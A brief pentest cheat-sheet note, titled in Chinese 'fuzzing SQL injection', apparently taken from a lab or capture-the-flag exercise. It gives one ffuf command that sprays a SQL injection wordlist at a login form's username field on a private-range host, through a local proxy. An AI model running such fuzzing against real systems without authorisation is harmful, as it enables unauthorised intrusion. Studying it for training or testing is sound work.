# 模糊sql注入

```bash
ffuf -X POST -u http://10.10.11.101/administrative -d 'uname=FUZZ&password=0xdf' -w /usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt -x http://127.0.0.1:8080 -H "Content-Type: application/x-www-form-urlencoded" --fw 206
```

‍
